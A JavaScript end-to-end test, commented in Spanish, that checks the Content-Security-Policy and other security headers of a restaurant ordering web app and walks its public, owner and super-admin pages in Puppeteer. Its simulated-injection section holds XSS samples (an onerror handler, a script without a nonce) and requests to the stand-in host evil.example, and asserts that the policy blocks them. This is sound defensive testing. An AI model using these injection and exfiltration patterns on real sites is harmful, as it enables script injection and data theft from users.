import puppeteer from "puppeteer-core";
import { readFileSync } from "node:fs";

const BASE = process.env.BASE || "http://localhost:3100";
const S = decodeURIComponent(new URL("..", import.meta.url).pathname);
const env = Object.fromEntries(readFileSync(S + "e2e4.env", "utf8").trim().split("\n").map((l) => l.split(/=(.*)/s).slice(0, 2)));
const res = [];
const ok = (c, m) => { res.push(!!c); console.log((c ? "OK    " : "FALLA ") + m); };
const dormir = (ms) => new Promise((r) => setTimeout(r, ms * 3)); // la red hacia Supabase va lenta desde aquí

// ============================================================ CABECERAS (peticiones directas)
console.log("--- CABECERAS ---");
const pedir = async (ruta) => fetch(BASE + ruta, { redirect: "manual" });
for (const ruta of ["/nueva-victoria", "/login", "/no-existe"]) {
  const r = await pedir(ruta);
  const csp = r.headers.get("content-security-policy") || "";
  const tiene = (d) => csp.includes(d);
  ok(tiene("script-src 'self' 'nonce-") && tiene("frame-ancestors 'none'") && tiene("object-src 'none'") && tiene("form-action 'self'") && tiene("base-uri 'self'"), `${ruta}: CSP con nonce, frame-ancestors, object-src, form-action y base-uri`);
  ok(!/unsafe-inline/.test(csp.replace("style-src-attr 'unsafe-inline'", "")) && !/unsafe-eval/.test(csp), `${ruta}: sin 'unsafe-inline' en scripts ni estilos (solo en atributos style) y sin 'unsafe-eval'`);
}
const r1 = await pedir("/nueva-victoria"), r2 = await pedir("/nueva-victoria");
const n1 = /nonce-([^']+)/.exec(r1.headers.get("content-security-policy"))?.[1], n2 = /nonce-([^']+)/.exec(r2.headers.get("content-security-policy"))?.[1];
ok(n1 && n2 && n1 !== n2, "el nonce cambia en cada petición");
ok((await r1.text()).includes(`nonce="${n1}"`), "los scripts del HTML llevan el nonce de esa petición");
const h = r1.headers;
ok(h.get("x-content-type-options") === "nosniff", "X-Content-Type-Options: nosniff");
ok(h.get("x-frame-options") === "DENY", "X-Frame-Options: DENY");
ok(h.get("referrer-policy") === "strict-origin-when-cross-origin", "Referrer-Policy");
ok((h.get("permissions-policy") || "").includes("camera=()") && (h.get("permissions-policy") || "").includes("geolocation=()"), "Permissions-Policy bloquea cámara y ubicación");
ok(!h.get("x-powered-by"), "ya no se anuncia x-powered-by");
const rb = await (await fetch(BASE + "/robots.txt")).text();
ok(rb.includes("Disallow: /admin") && rb.includes("Disallow: /superadmin") && rb.includes("Disallow: /login") && !/sitemap/i.test(rb), "robots.txt excluye panel y login, sin sitemap");
const sin = await pedir("/admin");
ok(sin.status === 307 && new URL(sin.headers.get("location") || "", BASE).pathname === "/login", "/admin sin sesión sigue redirigiendo a /login");

// ============================================================ RECORRIDO CON VIOLACIONES
const browser = await puppeteer.connect({ browserWSEndpoint: "ws://127.0.0.1:9222/session", protocol: "webDriverBiDi", defaultViewport: { width: 390, height: 900 } });
async function sesion() {
  const contexto = await browser.createBrowserContext();
  const page = await contexto.newPage();
  await page.evaluateOnNewDocument(() => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.violatedDirective} bloqueó ${e.blockedURI || "(inline)"}`));
  });
  const consola = [];
  page.on("console", (m) => { if (m.type() === "error" && /content.security|CSP|Refused/i.test(m.text())) consola.push(m.text()); });
  page.on("pageerror", (e) => { if (!/__cf_bm/.test(String(e))) consola.push("pageerror: " + e); }); // cookie de Cloudflare de las imágenes de Supabase: ajena a la app
  return { contexto, page, consola };
}
const violaciones = (page) => page.evaluate(() => window.__csp);
async function pantalla(s, ruta, accion) {
  await s.page.goto(BASE + ruta, { waitUntil: "networkidle0" });
  if (accion) await accion(s.page);
  await dormir(300);
  const v = await violaciones(s.page);
  ok(v.length === 0 && s.consola.length === 0, `${ruta}: ${v.length} violaciones de CSP${v.length ? " -> " + v.join(" | ") : ""}${s.consola.length ? " | consola: " + s.consola.join(" | ") : ""}`);
  s.consola.length = 0;
}
const login = async (s, c, k) => {
  await s.page.goto(BASE + "/login", { waitUntil: "networkidle0" });
  await s.page.$eval("input[name=correo]", (e, v) => (e.value = v), c);
  await s.page.$eval("input[name=clave]", (e, v) => (e.value = v), k);
  await s.page.evaluate(() => [...document.querySelectorAll("button")].find((b) => b.textContent.trim() === "Entrar").click());
  await s.page.waitForFunction(() => location.pathname !== "/login", { timeout: 10000 }).catch(() => {});
  await s.page.waitForNetworkIdle?.({ idleTime: 600, timeout: 8000 }).catch(() => {});
};

console.log("--- MENÚ PÚBLICO, CARRITO Y PEDIDO ---");
const P = await sesion();
await pantalla(P, "/nueva-victoria", async (page) => {
  await page.evaluate(() => { document.querySelectorAll('button[aria-label^="Agregar "]:not([aria-label^="Agregar uno"])').forEach((b, i) => i < 2 && b.click()); });
  await dormir(300);
  await page.evaluate(() => [...document.querySelectorAll("button")].find((b) => b.textContent.includes("Ver pedido")).click());
  await dormir(300);
  const dentro = await page.evaluate(() => !!document.querySelector("dialog[open]"));
  ok(dentro, "el pedido se abre (la hidratación funciona con la CSP)");
});
await pantalla(P, "/no-existe");
await pantalla(P, "/a/b/c");
await pantalla(P, "/login");

console.log("--- INYECCIÓN (simulada) ---");
await P.page.goto(BASE + "/nueva-victoria", { waitUntil: "networkidle0" });
const ataque = await P.page.evaluate(async () => {
  document.body.insertAdjacentHTML("beforeend", '<img src="x" onerror="window.__pwned2 = 1">');
  const i = new Image(); i.src = "https://evil.example/rastreo.png"; document.body.appendChild(i);
  let fetchExterno = "permitido";
  try { await fetch("https://evil.example/robar", { mode: "no-cors" }); } catch { fetchExterno = "bloqueado"; }
  await new Promise((r) => setTimeout(r, 400));
  const antes = window.__csp.slice();
  // <script> que llega dentro del HTML (lo que metería un atacante): sin nonce, no se ejecuta.
  document.open(); document.write('<html><body><script>window.__pwned1 = 1<\/script></body></html>'); document.close();
  await new Promise((r) => setTimeout(r, 400));
  return { p1: window.__pwned1, p2: window.__pwned2, fetchExterno, violaciones: antes };
});
ok(ataque.p1 === undefined, "un <script> inyectado sin nonce NO se ejecuta");
ok(ataque.p2 === undefined, "un manejador onerror inyectado NO se ejecuta");
ok(ataque.fetchExterno === "bloqueado", "una petición a un dominio externo queda bloqueada (connect-src)");
ok(ataque.violaciones.some((v) => v.startsWith("img-src")), "una imagen externa queda bloqueada (img-src)");
ok(ataque.violaciones.length >= 3, `el navegador registró ${ataque.violaciones.length} violaciones de la política`);

console.log("--- PANEL DEL DUEÑO ---");
const O = await sesion();
await login(O, env.OWN_CORREO, env.OWN_CLAVE);
await pantalla(O, "/admin/menu", async (page) => {
  // sube una foto (recorta con canvas y envía por Server Action)
  await page.evaluate(async () => {
    const li = document.querySelector('li[data-producto="Pan canilla"]');
    const c = document.createElement("canvas"); c.width = 900; c.height = 600; c.getContext("2d").fillRect(0, 0, 900, 600);
    const blob = await new Promise((r) => c.toBlob(r, "image/jpeg", 0.9));
    const dt = new DataTransfer(); dt.items.add(new File([blob], "f.jpg", { type: "image/jpeg" }));
    const inp = li.querySelector("input[type=file]"); inp.files = dt.files; inp.dispatchEvent(new Event("change", { bubbles: true }));
  });
  await page.waitForFunction(() => [...document.querySelectorAll('li[data-producto="Pan canilla"] [role=status]')].some((e) => e.textContent.includes("Foto guardada")), { timeout: 20000 }).catch(() => {});
  ok(await page.evaluate(() => [...document.querySelectorAll('li[data-producto="Pan canilla"] [role=status]')].some((e) => e.textContent.includes("Foto guardada"))), "subir foto funciona con la CSP (canvas + Server Action)");
  await page.evaluate(() => [...document.querySelectorAll('li[data-producto="Pan canilla"] button')].find((b) => b.textContent.trim() === "Quitar foto")?.click());
  await dormir(1500);
});
await pantalla(O, "/admin");
await pantalla(O, "/admin/pedidos");
await pantalla(O, "/admin/clientes");
await pantalla(O, "/admin/configuracion", async (page) => { await page.$eval("input[type=color]", (i) => { i.value = "#0f766e"; i.dispatchEvent(new Event("input", { bubbles: true })); }); });

console.log("--- SUPER ADMIN ---");
const A = await sesion();
await login(A, env.SA_CORREO, env.SA_CLAVE);
await pantalla(A, "/superadmin");
await pantalla(A, "/superadmin/locales/nueva-victoria");
await pantalla(A, "/superadmin/locales/nueva-victoria/menu");
await pantalla(A, "/superadmin/locales/nueva-victoria/pedidos");
await pantalla(A, "/superadmin/locales/nueva-victoria/clientes");
await pantalla(A, "/superadmin/locales/nueva-victoria/configuracion");
await pantalla(A, "/superadmin/cuenta");

for (const s of [P, O, A]) await s.contexto.close().catch(() => {});
await browser.disconnect();
console.log(`\n${res.filter(Boolean).length}/${res.length} pruebas correctas`);
process.exit(res.every(Boolean) ? 0 : 1);
